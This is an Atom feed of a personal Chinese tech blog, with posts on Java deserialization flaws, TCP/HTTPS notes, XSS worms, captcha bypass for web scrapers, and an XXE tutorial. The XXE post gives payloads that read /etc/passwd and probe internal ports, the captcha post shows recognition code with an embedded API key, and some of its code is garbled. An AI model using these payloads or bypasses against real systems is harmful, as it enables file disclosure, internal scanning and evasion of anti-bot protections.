<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风景这边独好</title>
  
  <subtitle>小风大浪，地狱天堂</subtitle>
  <link href="http://yejuns.github.io/atom.xml" rel="self"/>
  
  <link href="http://yejuns.github.io/"/>
  <updated>2021-07-05T12:30:39.206Z</updated>
  <id>http://yejuns.github.io/</id>
  
  <author>
    <name>Ye-Jun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web安全之反序列化漏洞-java</title>
    <link href="http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/"/>
    <id>http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/</id>
    <published>2021-06-14T08:01:51.000Z</published>
    <updated>2021-07-05T12:30:39.206Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-java序列化与反序列化"><a href="#1-java序列化与反序列化" class="headerlink" title="1.java序列化与反序列化"></a>1.java序列化与反序列化</h3><p>在Java中，只要一个类实现了<code>java.io.Serializable</code>接口，那么它就可以通过<code>ObjectInputStream</code>与<code>ObejctOutputStream</code>序列化.</p><h3 id="2-漏洞原因"><a href="#2-漏洞原因" class="headerlink" title="2.漏洞原因"></a>2.漏洞原因</h3><p>当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码，<br>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取输入流,并转换对象</span></span><br><span class="line">InputStream in=request.getInputStream();</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure><p>暴露或间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以构造反序列化对象并执行恶意代码</p><h3 id="3、案例"><a href="#3、案例" class="headerlink" title="3、案例"></a>3、案例</h3><ol><li><a href="https://www.freebuf.com/vuls/270859.html">Apache Commons Collections反序列化漏洞详解</a></li><li><a href="https://bbs.ichunqiu.com/thread-61162-1-1.html">shiro反序列化漏洞</a><br>其实自己还是有点没看明白，大概理解是使用gadget触发相关漏洞，但有部分细节还不了解</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-java序列化与反序列化&quot;&gt;&lt;a href=&quot;#1-java序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;1.java序列化与反序列化&quot;&gt;&lt;/a&gt;1.java序列化与反序列化&lt;/h3&gt;&lt;p&gt;在Java中，只要一个类实现了&lt;code&gt;j</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络复习笔记</title>
    <link href="http://yejuns.github.io/2021/05/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yejuns.github.io/2021/05/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-01T13:01:21.000Z</published>
    <updated>2021-07-18T14:28:49.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>arp协议即地址解析协议，是根据IP地址获取物理地址的一个TCP/IP协议。它可以解决同一个局域网内主机或路由器的IP地址和MAC地址的映射问题。</p><ul><li>arp协议在TCP/IP模型中属于IP层(网络层),原因在于ARP协议属于TCP/IP协议簇，而在TCP/IP模型中，所有定义的协议至少是在网际层（或称网络层，IP层）</li><li>在OSI模型中属于链路层,按照OSI的标准,当数据向下传递时,每层会加上自己的信息,各层互不干扰.这样当网络层的IP包进入链路层时,链路层该如何加这个头部的目标信息呢?它要依靠ARP协议来完成.显然如何加链路头并不是网络层的功能。而且，ARP协议工作时，并不使用IP的包头。所以也有很多人说，ARP是链路层的</li></ul><h2 id="TCP连接与断开"><a href="#TCP连接与断开" class="headerlink" title="TCP连接与断开"></a>TCP连接与断开</h2><h3 id="TCP状态（SYN、FIN、ACK）"><a href="#TCP状态（SYN、FIN、ACK）" class="headerlink" title="TCP状态（SYN、FIN、ACK）"></a>TCP状态（SYN、FIN、ACK）</h3><ul><li>SYN(Synchronize) 建立连接</li><li>FIN 断开连接</li><li>ACK 表示响应</li><li>PSH 有DATA数据传输</li><li>RST 连接重置</li></ul><p>如果出现SYN/FIN包的组合，很有可能这是一个攻击，因为SYN和FIN不应该一起出现  </p><h3 id="三次握手过程"><a href="#三次握手过程" class="headerlink" title="三次握手过程"></a>三次握手过程</h3><p>1、（B）-&gt;[SYN] -&gt; (A) </p><p>当客户机B和服务器A通信时，B首先向A发送一个SYN标识的包，告诉A建立连接；(SYN包就是仅SYN标记标为1的TCP包)</p><p>2、（B）&lt;-[SYN/ACK] &lt;- (A)</p><p>接着，A收到后会发一个对SYN包的确定包（SYN/ACK）回去，表示对第一个SYN包的确定，并继续握手协议</p><p>3、（B）-&gt;[ACK] -&gt; (A)<br>B收到SYN/ACK包，B发一个确认包（ACK），通知连接已经建立。至此，三次握手完成。</p><h3 id="四次挥手过程"><a href="#四次挥手过程" class="headerlink" title="四次挥手过程"></a>四次挥手过程</h3><p>1、(B) -&gt; FIN+ack -&gt; (A)</p><p>2、(B) &lt;- ACK  &lt;- (A)</p><p>3、(B) &lt;- FIN+ACK  &lt;- (A)</p><p>4、(B) -&gt; ACK -&gt; (A)</p><p>因为TCP连接是双向连接，因此关闭连接需要在两个方向上做。</p><p>四次挥手不是关闭TCP连接的唯一方式，有时主机需要尽快关闭连接（或连接超时、主机不可达），RST包将被发送，因为RST包是不需要接收方确认的，所以RST包对于ACK可带可不带。</p><p>为什么是四次挥手而不是三次挥手？</p><p>因为TCP是<code>全双工通信</code>的，</p><p>（1）第一次挥手<br>因此当主动方发送断开连接的请求（即FIN报文）给被动方时，仅仅代表主动方不会再发送数据报文了，但主动方仍可以接收数据报文。 </p><p>（2）第二次挥手<br>被动方此时有可能还有相应的数据报文需要发送，因此需要先发送ACK报文，告知主动方“我知道你想断开连接的请求了”。这样主动方便不会因为没有收到应答而继续发送断开连接的请求（即FIN报文）。 </p><p>（3）第三次挥手    被动方在处理完数据报文后，便发送给主动方FIN报文；这样可以保证数据通信正常可靠地完成。发送完FIN报文后，被动方进入LAST_ACK阶段（超时等待）。</p><p>（4）第四挥手    如果主动方及时发送ACK报文进行连接中断的确认，这时被动方就直接释放连接，进入可用状态。</p><hr><h2 id="HTTPS建立连接的过程"><a href="#HTTPS建立连接的过程" class="headerlink" title="HTTPS建立连接的过程"></a>HTTPS建立连接的过程</h2><p>https是在http的基础上和ssl/tls证书结合的一种协议，保证了传输过程中的安全性，解决了http的3个缺点（被监听、被篡改、被伪装）</p><h3 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h3><p>HTTP和HTTPS都建立在连接的基础上进行数据传输，都基于TCP，建立连接都要经过3次握手</p><p>当在浏览器中输入地址后，会先根据浏览器DNS缓存、本地DNS缓存、和HOST中寻找对应的记录，如果没有找到会请求DNS服务来获取对应的ip</p><h3 id="建立连接的过程"><a href="#建立连接的过程" class="headerlink" title="建立连接的过程"></a>建立连接的过程</h3><ol><li>客户端发送请求到服务器，告诉自己支持的加密协议以及版本</li><li>服务端选择合适的加密协议，返回一个证书给客户端，证书里面有公钥</li><li>客户端接收公钥后验证证书的安全性，如果通过会生成一个随机数，用公钥对其机密后发送到服务端;<br>(随机数产生的原因是<code>减少公钥加密计算量太大所消耗的时间</code>)</li><li>服务端接收到加密后的随机数，用私钥解密后得到真正的随机数，然后用这个随机数当秘钥（<code>对称秘钥</code>）对需要发送的数据进行加密</li><li>客户端接收到加密的数据后使用生成的随机数（<code>对称秘钥</code>）对数据进行解密，将结果呈现</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ARP协议&quot;&gt;&lt;a href=&quot;#ARP协议&quot; class=&quot;headerlink&quot; title=&quot;ARP协议&quot;&gt;&lt;/a&gt;ARP协议&lt;/h2&gt;&lt;p&gt;arp协议即地址解析协议，是根据IP地址获取物理地址的一个TCP/IP协议。它可以解决同一个局域网内主机或路由器的I</summary>
      
    
    
    
    
    <category term="计算机网络" scheme="http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>web安全之XSS蠕虫</title>
    <link href="http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/"/>
    <id>http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/</id>
    <published>2021-04-21T03:01:51.000Z</published>
    <updated>2021-07-04T06:48:02.274Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss蠕虫"><a href="#xss蠕虫" class="headerlink" title="xss蠕虫"></a>xss蠕虫</h2><p>一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安<br>全限制，XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。</p><h3 id="XSS蠕虫一般原理"><a href="#XSS蠕虫一般原理" class="headerlink" title="XSS蠕虫一般原理"></a>XSS蠕虫一般原理</h3><ol><li>基于存储型XSS 漏洞，攻击者在Web 页面植入恶意代码。</li><li>发送伪装的邀请链接。</li><li>用户点击链接被感染。</li><li>新感染用户的向好友发送伪装的邀请链接。</li></ol><h2 id="Samy-蠕虫"><a href="#Samy-蠕虫" class="headerlink" title="Samy 蠕虫"></a>Samy 蠕虫</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;xss蠕虫&quot;&gt;&lt;a href=&quot;#xss蠕虫&quot; class=&quot;headerlink&quot; title=&quot;xss蠕虫&quot;&gt;&lt;/a&gt;xss蠕虫&lt;/h2&gt;&lt;p&gt;一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安&lt;br&gt;全限制，XSS 蠕虫基于社会工程学诱</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>爬虫过验证码</title>
    <link href="http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/</id>
    <published>2021-04-09T08:01:51.000Z</published>
    <updated>2021-07-09T13:38:21.603Z</updated>
    
    <content type="html"><![CDATA[<p>在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。</p><h2 id="1、使用pytesseract模块和PIL模块识别"><a href="#1、使用pytesseract模块和PIL模块识别" class="headerlink" title="1、使用pytesseract模块和PIL模块识别"></a>1、使用pytesseract模块和PIL模块识别</h2><p>使用pip安装相关的包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pytesseract</span><br><span class="line">pip install pil</span><br></pre></td></tr></table></figure><p>整个验证码识别的思路很简单：</p><ol><li>截取整个界面</li><li>获取验证码位置的坐标，并截取对应位置的图片</li><li>使用pytesseract模块进行验证</li></ol><p>主要的功能代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打开谷歌浏览器</span></span><br><span class="line">   browser = webdriver.Chrome()</span><br><span class="line">   <span class="comment">#打开首页</span></span><br><span class="line">   browser.get(<span class="string">&quot;http://localhost:8080/jpress/user/register&quot;</span>)</span><br><span class="line">   browser.maximize_window()</span><br><span class="line">   <span class="comment">#获取验证码图片</span></span><br><span class="line">   t = time.time()</span><br><span class="line">   picture_name1 = <span class="built_in">str</span>(t)+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">   browser.save_screenshot(picture_name1)</span><br><span class="line">   ce = browser.find_element_by_id(<span class="string">&quot;captchaimg&quot;</span>)</span><br><span class="line">   print(ce.location)</span><br><span class="line">   left = ce.location[<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">   top = ce.location[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line">   right = ce.size[<span class="string">&#x27;width&#x27;</span>] + left</span><br><span class="line">   height = ce.size[<span class="string">&#x27;height&#x27;</span>] + top</span><br><span class="line">   im = Image.<span class="built_in">open</span>(picture_name1)</span><br><span class="line">   <span class="comment"># 抠图</span></span><br><span class="line">   img = im.crop((left,top,right, height))</span><br><span class="line">   t = time.time()</span><br><span class="line">   picture_name2 = <span class="built_in">str</span>(t)+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">   img.save(picture_name2)<span class="comment">#这里就是截取到的验证码图片</span></span><br><span class="line">   browser.close()</span><br></pre></td></tr></table></figure><p>pytesseract虽然很简单直观，但是无法处理比较复杂的验证码。这时候其实我们还可以使用一些方法对图片进行处理，提供识别率。比如对截取的图片转为灰度，将有效信息转为黑，背景和干扰转为白色。</p><p>由于我们需要找到一个像素阈值能够将灰度图片中真实数据和背景干扰分开，因此这一步骤可以借助PS等工具，我们在这里设置为200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">img = image_obj.convert(<span class="string">&quot;L&quot;</span>)  <span class="comment"># 转灰度图</span></span><br><span class="line">pixdata = img.load()</span><br><span class="line">w, h = img.size</span><br><span class="line">threshold = <span class="number">200</span></span><br><span class="line"><span class="comment"># 遍历所有像素，大于阈值的为黑色</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h): <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w): <span class="keyword">if</span> pixdata[x, y] &lt; threshold: pixdata[x, y] =<span class="string">&quot; 0&quot;</span> <span class="keyword">else</span>:&gt;</span><br><span class="line"><span class="comment"># 根据像素二值结果重新生成图片</span></span><br><span class="line">data = img.getdata()</span><br><span class="line">w, h = img.size</span><br><span class="line">black_point = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, w - <span class="number">1</span>): <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, h - <span class="number">1</span>): mid_pixel = data[w * y + x] <span class="keyword">if</span> mid_pixel &lt; <span class="number">50</span>: top_pixel =<span class="string">&quot; data[w * (y - 1) + x]&quot;</span> left_pixel =<span class="string">&quot; data[w * y + (x - 1)]&quot;</span> down_pixel =<span class="string">&quot; data[w * (y + 1) + x]&quot;</span> right_pixel =<span class="string">&quot; data[w * y + (x + 1)]&quot;</span> <span class="keyword">if</span> top_pixel &lt; <span class="number">10</span>: black_point +=<span class="string">&quot; 1&quot;</span> <span class="keyword">if</span> left_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> down_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> right_pixel &lt; <span class="number">10</span>: <span class="keyword">if</span> black_point &lt; <span class="number">1</span>: img.putpixel((x, y), <span class="number">255</span>) black_point =<span class="string">&quot; 0&quot;</span> img.show()&lt; code&gt;</span><br></pre></td></tr></table></figure><p>转换前的图片</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/srcapyselenium-7.png">“</p><p>转换后的图片</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/srcapyselenium-8.png">“</p><h2 id="2、使用第三方API接口帮助识别"><a href="#2、使用第三方API接口帮助识别" class="headerlink" title="2、使用第三方API接口帮助识别"></a>2、使用第三方API接口帮助识别</h2><p>我以前是使用<code>showapi</code>,当然也可以选择别的方法，<a href="https://www.showapi.com/apiGateway/view/2360">地址</a></p><p>整个验证的流程是：</p><ol><li>下载官方提供的SDK包</li><li>在请求参数中加入自己的key</li><li>把图片和key值一起传给远程API，接收识别出的结果</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.ShowapiRequest <span class="keyword">import</span> ShowapiRequest</span><br><span class="line"></span><br><span class="line">r = ShowapiRequest(<span class="string">&quot;http://route.showapi.com/184-4&quot;</span>,<span class="string">&quot;272526&quot;</span>,<span class="string">&quot;a924d4e982ae404b8a068b4d1c7784f2&quot;</span> )</span><br><span class="line">r.addFilePara(<span class="string">&quot;image&quot;</span>, <span class="string">&quot;test.png&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;typeId&quot;</span>, <span class="string">&quot;34&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;convert_to_jpg&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">r.addBodyPara(<span class="string">&quot;needMorePrecise&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">res = r.post()</span><br><span class="line">result = res.text</span><br><span class="line">print(result)</span><br><span class="line">body = res.json()[<span class="string">&#x27;showapi_res_body&#x27;</span>]</span><br><span class="line">print(body[<span class="string">&#x27;Result&#x27;</span>])</span><br><span class="line"><span class="comment"># print(res.text) # 返回信息</span></span><br></pre></td></tr></table></figure><p>有时候我们也可以自己使用<code>tensorflow</code>进行训练.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。&lt;/p&gt;
&lt;h2 id=&quot;1、使用pytesseract模块和PIL模块识别&quot;&gt;&lt;a href=&quot;#1、使用pytesseract模块和PIL模块识别&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="爬虫" scheme="http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Web安全之XXE</title>
    <link href="http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/"/>
    <id>http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-07-04T08:02:23.953Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外部实体数据进行处理时引发的安全问题。（我们提交的post数据中，body可以是<code>application/xml</code>的形式）</p><h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者通过向服务器注入指定的xml实体内容,从而让服务器加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。也就是说服务端接收和解析了来自客户端的xml数据,而又没有做严格的安全过滤校验,从而导致xml外部实体注入漏洞的产生。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p><p>以下是一个正常的XML代码POST请求示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</p><p>我们尝试编辑恶意的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码被解释并返回：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;error&quot;</span>: <span class="string">&quot;no results for description root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="string">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span></span><br><span class="line"><span class="string">bin:x:2:2:bin:/bin:/bin/sh</span></span><br><span class="line"><span class="string">sys:x:3:3:sys:/dev:/bin/sh</span></span><br><span class="line"><span class="string">sync:x:4:65534:sync:/bin:/bin/sync...</span></span><br></pre></td></tr></table></figure><p>这样，我们就变相的读取了/etc/passwd文件</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>我们也可以使用http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:8080&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XXE漏洞&quot;&gt;&lt;a href=&quot;#XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE漏洞&quot;&gt;&lt;/a&gt;XXE漏洞&lt;/h2&gt;&lt;p&gt;XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-排序</title>
    <link href="http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/"/>
    <id>http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-07-18T12:07:40.779Z</updated>
    
